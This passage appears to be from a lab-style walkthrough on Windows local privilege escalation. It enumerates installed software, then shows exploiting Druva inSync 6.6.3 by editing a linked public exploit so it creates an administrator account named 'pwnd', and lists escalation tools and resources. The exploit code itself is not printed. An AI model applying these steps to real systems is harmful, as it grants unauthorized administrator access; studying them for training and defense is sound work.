VNC Server 6.8.0                                                RealVNC                                  6.8.0.45849
Amazon SSM Agent                                                Amazon Web Services                      3.0.529.0
aws-cfn-bootstrap                                               Amazon Web Services                      2.0.5
Druva inSync 6.6.3                                              Druva Technologies Pte. Ltd.             6.6.3.0
AWS PV Drivers                                                  Amazon Web Services                      8.3.4
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910  Microsoft Corporation                    14.28.29910

```

Or you can use **PowerShell (Registry Check)**

```powershell
# 64-bit apps
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" | 
  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | 
  Format-Table -AutoSize

# 32-bit apps (on 64-bit Windows)
Get-ItemProperty "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | 
  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | 
  Format-Table -AutoSize
```

then search for potential vulnerabilities in [exploit-db](https://www.exploit-db.com/), [packet storm](https://packetstormsecurity.com/) or [Google](https://www.google.com/),

### **Case Study: Druva inSync 6.6.3**

The target is running **Druva inSync 6.6.3,** which is vulnerable to privilege escalation, as reported by [Matteo Malvica](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/). The vulnerability results from a bad patch reported for version 6.5.0 by [Chris Lyne](https://www.tenable.com/security/research/tra-2020-12) which allows Local Privilege Escalation (LPE) via Command Injection. 

The fix includes a path checker; any binary invoked outside the scope of the inSync path will just be ignored, but this has been implemented only through a '`strncmp`' function which can be bypassed by appending a directory traversal escape sequence at the end of the valid path.

The exploit can be found [here](https://packetstorm.news/files/id/160404). copy it to the target machine, then change the `$cmd` variable to create a new user and add it to the administrators group. 

<img width="1735" height="725" alt="Screenshot 2025-08-17 134809" src="https://github.com/user-attachments/assets/bd974541-a478-498d-bd2c-08a4cad84c3a" />

To check if the exploit works, run this command `net user pwnd` Verify that the user `pwnd` exists and is part of the administrators' group. 

<img width="1166" height="285" alt="Screenshot 2025-08-17 134836" src="https://github.com/user-attachments/assets/22c437e2-9160-421a-9cf0-fdedc5db8778" />

Now, run the command prompt as administrator. When prompted for credentials, click on **More choices,** and use the `pwnd` account 

<img width="721" height="725" alt="Screenshot 2025-08-17 135840" src="https://github.com/user-attachments/assets/b552cdf4-2f34-40ad-88f1-a728150d2968" />

<img width="779" height="282" alt="Screenshot 2025-08-17 135927" src="https://github.com/user-attachments/assets/f8f3dce9-01f1-4cd8-8b8b-e7d615eb3c70" />

## Tools of the Trade

### Tools

Here are some tools that can be used to automate the enumeration process.

- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS): search for possible **Privilege Escalation Paths** in Windows environments.
- [PrivescCheck](https://github.com/itm4n/PrivescCheck): PowerShell script used to list Local Privilege Escalation (LPE) vulnerabilities
- [WES-NG](https://github.com/bitsadmin/wesng) :list potential vulnerabilities based on the result of `systeminfo` command
- **Metasploit:** use `multi/recon/local_exploit_suggester`

### Additional Resources

- [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
- [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
- [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
- [Decoder's Blog](https://decoder.cloud/)
- [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
- [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
